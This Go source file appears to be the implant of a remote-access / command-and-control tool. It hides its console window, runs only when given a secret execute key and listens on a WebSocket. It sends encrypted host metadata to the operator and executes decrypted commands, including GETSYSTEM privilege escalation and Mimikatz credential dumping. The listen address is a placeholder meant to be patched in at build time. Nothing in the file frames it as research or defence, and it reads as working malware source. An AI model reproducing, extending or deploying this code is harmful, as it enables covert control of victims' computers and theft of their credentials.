// websocket_listener.go
package main

import (
	"Reacon/pkg/communication"
	"rshell-client/shared/config"
	"rshell-client/shared/encrypt"
	"rshell-client/shared/link"
	"rshell-client/shared/services"
	"rshell-client/shared/utils"
	"context"
	"encoding/binary"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

func init() {
	link.ReportError = communication.ErrorProcess
	link.ReportData = communication.DataProcess
}

// WebSocketListener 结构体，替代原有的TCP Listener
type WebSocketListener struct {
	Clients     map[string]*WSClient
	ClientsMu   sync.RWMutex
	IsRunning   bool
	stopChan    chan struct{}
	keepAlive   *time.Ticker
	upgrader    websocket.Upgrader
	CurrentConn *websocket.Conn // 当前活跃连接（保留用于兼容性）
}

// WSClient WebSocket客户端结构
type WSClient struct {
	Conn          *websocket.Conn
	RemoteAddr    string
	UID           string
	LastHeartbeat time.Time
	IsClosed      bool
	PingTicker    *time.Ticker // WebSocket ping定时器
	WriteMu       sync.Mutex   // 保护写入操作，防止并发写入
}

// RunWebSocketListener 启动WebSocket监听器
func RunWebSocketListener(listenAddr string) {
	listener := &WebSocketListener{
		Clients:  make(map[string]*WSClient),
		stopChan: make(chan struct{}),
		upgrader: websocket.Upgrader{
			ReadBufferSize:  4096,
			WriteBufferSize: 4096,
			CheckOrigin: func(r *http.Request) bool {
				return true // 允许所有来源，生产环境需要修改
			},
		},
	}
	listener.Start(listenAddr)
}

func (wsl *WebSocketListener) Start(listenAddr string) {
	wsl.IsRunning = true

	wsl.keepAlive = time.NewTicker(20 * time.Second)
	go wsl.heartbeatLoop()

	http.HandleFunc("/ws", wsl.handleWebSocket)

	server := &http.Server{
		Addr:         listenAddr,
		ReadTimeout:  60 * time.Second,
		WriteTimeout: 60 * time.Second,
	}

	go func() {
		if err := server.ListenAndServe(); err != nil {
			if err != http.ErrServerClosed {
			}
		}
	}()

	<-wsl.stopChan
	wsl.IsRunning = false
	wsl.keepAlive.Stop()
	server.Close()

	// 关闭所有连接
	wsl.closeAllConnections()
}

func (wsl *WebSocketListener) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	wsl.ClientsMu.RLock()
	hasActiveConnection := false
	for _, client := range wsl.Clients {
		if !client.IsClosed {
			hasActiveConnection = true
			break
		}
	}
	wsl.ClientsMu.RUnlock()

	if hasActiveConnection {
		fmt.Printf("Rejecting new connection from %s: already have an active connection\n", r.RemoteAddr)
		http.Error(w, "Server already has an active connection", http.StatusServiceUnavailable)
		return
	}

	conn, err := wsl.upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}

	remoteAddr := r.RemoteAddr
	if r.Header.Get("X-Real-IP") != "" {
		remoteAddr = r.Header.Get("X-Real-IP")
	} else if r.Header.Get("X-Forwarded-For") != "" {
		remoteAddr = r.Header.Get("X-Forwarded-For")
	}

	// fmt.Printf("New WebSocket connection from: %s\n", remoteAddr)

	// 创建客户端
	client := &WSClient{
		Conn:          conn,
		RemoteAddr:    remoteAddr,
		LastHeartbeat: time.Now(),
		IsClosed:      false,
		// PingTicker:    time.NewTicker(30 * time.Second),
	}

	// 生成临时ID
	tempID := fmt.Sprintf("ws_%s_%d", remoteAddr, time.Now().UnixNano())
	client.UID = tempID

	// 添加到客户端列表
	wsl.ClientsMu.Lock()
	wsl.Clients[tempID] = client
	wsl.CurrentConn = conn
	wsl.ClientsMu.Unlock()

	// 设置Pong处理器
	conn.SetPongHandler(func(appData string) error {
		wsl.ClientsMu.Lock()
		if client, exists := wsl.Clients[tempID]; exists {
			client.LastHeartbeat = time.Now()
		}
		wsl.ClientsMu.Unlock()
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		return nil
	})
	conn.SetPingHandler(func(appData string) error {
		// 自动回复Pong
		client.WriteMu.Lock()
		defer client.WriteMu.Unlock()
		return conn.WriteControl(websocket.PongMessage, []byte(appData), time.Now().Add(10*time.Second))
	})

	// 启动ping协程
	go client.startPing()

	// 发送FirstBlood消息
	if err := wsl.sendFirstBlood(client); err != nil {
		fmt.Printf("Failed to send first blood: %v\n", err)
		conn.Close()
		wsl.removeClient(tempID)
		return
	}
	communication.WebsocketClient = conn

	// 消息处理循环
	wsl.handleConnection(client)
}

func (wsl *WebSocketListener) handleConnection(client *WSClient) {
	defer func() {
		// 清理资源
		client.IsClosed = true
		if client.PingTicker != nil {
			client.PingTicker.Stop()
		}
		client.Conn.Close()
		wsl.removeClient(client.UID)
		fmt.Printf("WebSocket connection closed: %s\n", client.RemoteAddr)
	}()

	for {
		// 设置读取超时
		client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		messageType, message, err := client.Conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				fmt.Printf("WebSocket closed unexpectedly: %v\n", err)
			} else if websocket.IsCloseError(err) {
				fmt.Printf("WebSocket closed normally\n")
			} else {
				fmt.Printf("WebSocket read error: %v\n", err)
			}
			break
		}

		// 只处理二进制消息
		if messageType != websocket.BinaryMessage {
			fmt.Println("Received non-binary message, ignoring")
			continue
		}

		// 处理消息
		go wsl.processMessage(message, client)
	}
}

func (wsl *WebSocketListener) sendFirstBlood(client *WSClient) error {
	if len(utils.MetaInfo) == 0 {
		var err error
		utils.MetaInfo, err = utils.EncryptedMetaInfo()
		if err != nil {
			return err
		}
		utils.MetaInfo, err = encrypt.EncodeBase64(utils.MetaInfo)
		if err != nil {
			return err
		}
	}


	firstBloodType := make([]byte, 4)
	binary.BigEndian.PutUint32(firstBloodType, 1)

	firstBloodMsg := append(firstBloodType, utils.MetaInfo...)

	client.WriteMu.Lock()
	defer client.WriteMu.Unlock()
	return client.Conn.WriteMessage(websocket.BinaryMessage, firstBloodMsg)
}

func (wsl *WebSocketListener) processMessage(data []byte, client *WSClient) {

	if len(data) < 4 {
		return
	}

	// Server 发来的消息格式: [4B msgType][4B metaLen][metainfo][base64payload]
	// 也可能是纯 base64（无头）。先尝试跳过 msgType 头
	payload := data
	msgType := binary.BigEndian.Uint32(data[:4])
	if msgType == 1 || msgType == 2 || msgType == 3 {
		if len(data) >= 8 {
			metaLen := binary.BigEndian.Uint32(data[4:8])
			if len(data) >= int(8+metaLen) {
				payload = data[8+metaLen:]
			} else {
				payload = data[4:]
			}
		} else {
			payload = data[4:]
		}
	}

	rawData, err := encrypt.DecodeBase64(payload)
	if err != nil {
		return
	}

	data1, err := encrypt.Decrypt(rawData)
	if err != nil {
		return
	}

	decrypted, err := encrypt.Decrypt(data1)
	if err != nil {
		return
	}

	if len(decrypted) < 4 {
		return
	}

	cmdType := binary.BigEndian.Uint32(decrypted[:4])
	cmdBuf := decrypted[4:]

	if cmdType == services.GETSYSTEM || cmdType == services.MIMIKATZ {
		go func(ct uint32, cb []byte) {
			result, callbackType, err := services.DispatchCommand(ct, cb)
			if err != nil {
				communication.ErrorProcess(err)
			} else if callbackType >= 0 {
				communication.DataProcess(callbackType, result)
			}
		}(cmdType, cmdBuf)
		return
	}

	if cmdBuf != nil {
		result, callbackType, err := services.DispatchCommand(cmdType, cmdBuf)
		if cmdType == services.EXIT && err == nil {
			os.Exit(1)
		}
		if err != nil {
			communication.ErrorProcess(err)
		} else if callbackType >= 0 {
			communication.DataProcess(callbackType, result)
		}

		// 发送响应
		if err != nil {
			communication.ErrorProcess(err)
		} else {
			if callbackType >= 0 {
				communication.DataProcess(callbackType, result)
			}
		}
	}
}

// processRawMessage 处理没有长度前缀的原始消息
func (wsl *WebSocketListener) processRawMessage(data []byte, conn *websocket.Conn) {
	// 直接处理消息，假设data已经是解密后的命令数据
	if len(data) < 4 {
		fmt.Println("Raw message too short")
		return
	}

	// 尝试解密（可能已经是解密后的数据）
	decrypted, err := encrypt.DecodeBase64(data)
	if err != nil {
		// 可能不是base64编码，直接当作解密后的数据
		decrypted = data
	}

	decrypted, err = encrypt.Decrypt(decrypted)
	if err != nil {
		fmt.Println("Decrypt error:", err)
		return
	}

	if len(decrypted) < 4 {
		return
	}

	cmdType := binary.BigEndian.Uint32(decrypted[:4])
	cmdBuf := decrypted[4:]

	// 这里可以调用原有的命令处理逻辑
	// 为了简洁，这里只打印消息
	fmt.Printf("Received raw command type: %d, data length: %d\n", cmdType, len(cmdBuf))
}

func (wsl *WebSocketListener) sendResponse(responseType int, data []byte, client *WSClient) error {
	responseTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(responseTypeBytes, uint32(responseType))

	responseData := append(responseTypeBytes, data...)

	// 加密响应
	encrypted, err := encrypt.Encrypt(responseData)
	if err != nil {
		return err
	}

	encoded, err := encrypt.EncodeBase64(encrypted)
	if err != nil {
		return err
	}

	// 构造消息
	metaInfo := utils.MetaInfo
	metaLen := make([]byte, 4)
	binary.BigEndian.PutUint32(metaLen, uint32(len(metaInfo)))

	fullMsg := append(metaLen, metaInfo...)
	fullMsg = append(fullMsg, encoded...)

	msgType := uint32(2) // otherMsg
	msgTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(msgTypeBytes, msgType)

	finalMsg := append(msgTypeBytes, fullMsg...)

	// WebSocket不需要添加TCP的长度前缀
	// 直接发送消息
	client.WriteMu.Lock()
	defer client.WriteMu.Unlock()
	return client.Conn.WriteMessage(websocket.BinaryMessage, finalMsg)
}

func (wsl *WebSocketListener) sendErrorResponse(err error, client *WSClient) error {
	errorMsg := []byte(err.Error())
	return wsl.sendResponse(31, errorMsg, client)
}

// 修改heartbeatLoop，只发送类型3心跳，不使用goroutine
func (wsl *WebSocketListener) heartbeatLoop() {
	for range wsl.keepAlive.C {
		wsl.ClientsMu.RLock()

		for uid, client := range wsl.Clients {
			if client.IsClosed {
				continue
			}

			// 检查最后活动时间（现在基于WebSocket Pong更新）
			if time.Since(client.LastHeartbeat) > 60*time.Second {
				fmt.Printf("Client %s no activity for %v, marking as inactive\n",
					uid, time.Since(client.LastHeartbeat))
				continue
			}

			// 发送类型3的心跳消息
			heartBeatType := make([]byte, 4)
			binary.BigEndian.PutUint32(heartBeatType, 3) // 心跳类型为3

			heartBeatMsg := append(heartBeatType, utils.MetaInfo...)

			// 直接发送，使用锁保护写入
			client.WriteMu.Lock()
			err := client.Conn.WriteMessage(websocket.BinaryMessage, heartBeatMsg)
			client.WriteMu.Unlock()
			if err != nil {
				fmt.Printf("Failed to send heartbeat to client %s: %v\n", uid, err)
				client.IsClosed = true
			}
		}

		wsl.ClientsMu.RUnlock()
	}
}

// 修改startPing方法
func (client *WSClient) startPing() {
	ticker := time.NewTicker(25 * time.Second) // 比超时时间短
	defer ticker.Stop()

	for range ticker.C {
		if client.IsClosed {
			return
		}

		// 发送ping消息，设置写超时
		_, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		client.WriteMu.Lock()
		err := client.Conn.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(10*time.Second))
		client.WriteMu.Unlock()
		cancel()

		if err != nil {
			fmt.Printf("Failed to send ping to client %s: %v\n", client.UID, err)
			client.IsClosed = true
			return
		}
	}
}

func (wsl *WebSocketListener) removeClient(uid string) {
	wsl.ClientsMu.Lock()
	defer wsl.ClientsMu.Unlock()

	if client, exists := wsl.Clients[uid]; exists {
		client.IsClosed = true
		delete(wsl.Clients, uid)

		// 更新当前活跃连接
		if wsl.CurrentConn == client.Conn {
			wsl.CurrentConn = nil
			// 尝试设置另一个客户端为当前连接
			for _, c := range wsl.Clients {
				if !c.IsClosed {
					wsl.CurrentConn = c.Conn
					break
				}
			}
		}
	}
}

func (wsl *WebSocketListener) closeAllConnections() {
	wsl.ClientsMu.Lock()
	defer wsl.ClientsMu.Unlock()

	for uid, client := range wsl.Clients {
		client.IsClosed = true
		if client.PingTicker != nil {
			client.PingTicker.Stop()
		}
		client.Conn.Close()
		delete(wsl.Clients, uid)
	}
	wsl.CurrentConn = nil
}

func (wsl *WebSocketListener) Stop() {
	if wsl.IsRunning {
		close(wsl.stopChan)
		wsl.IsRunning = false
	}
}

func main() {
	if config.ExecuteKey != "" {
		if len(os.Args) != 2 {
			return
		}
		if os.Args[1] != config.ExecuteKey {
			return
		}
	}
	// 隐藏控制台
	errConsole := services.HideConsole()
	if errConsole != nil && errConsole.Error() != "" {
		fmt.Println(errConsole)
	}

	// DPI感知
	errDPI := services.ProcessDPIAware()
	if errDPI != nil && errDPI.Error() != "" {
		fmt.Println(errDPI)
	}

	// 生成密钥对
	encrypt.GenerateKeyPair()

	listenAddr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	listenAddr = strings.ReplaceAll(listenAddr, " ", "")
	RunWebSocketListener(listenAddr)
}
